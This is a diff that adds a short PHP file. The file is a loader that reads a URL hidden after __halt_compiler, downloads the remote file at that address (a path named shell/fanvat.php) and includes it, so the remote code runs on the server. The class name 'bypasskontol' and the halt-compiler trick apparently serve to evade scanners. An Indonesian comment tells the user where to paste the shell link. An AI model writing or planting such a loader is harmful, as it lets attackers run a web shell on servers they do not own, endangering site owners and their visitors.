@@ -1,0 +1,17 @@
+<?php
+class bypasskontol {
+    private $shift;
+    private $cyaa;
+    public function manggilMemanggil($cyaa, $shift){
+        $fp = fopen($cyaa, 'r');
+        fseek($fp, $shift);
+        $temp_filee = tmpfile();
+        fwrite($temp_filee, implode('', file(stream_get_contents($fp))));
+        include socket_get_status($temp_filee)['uri'];
+        fclose($temp_filee);
+    }
+}
+$stdIn = new bypasskontol(3, 'nande ?');
+$stdIn->manggilMemanggil(__FILE__, __COMPILER_HALT_OFFSET__);
+__halt_compiler
+/*Link URL TARO SETELAH TANDA "()"*/();https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php
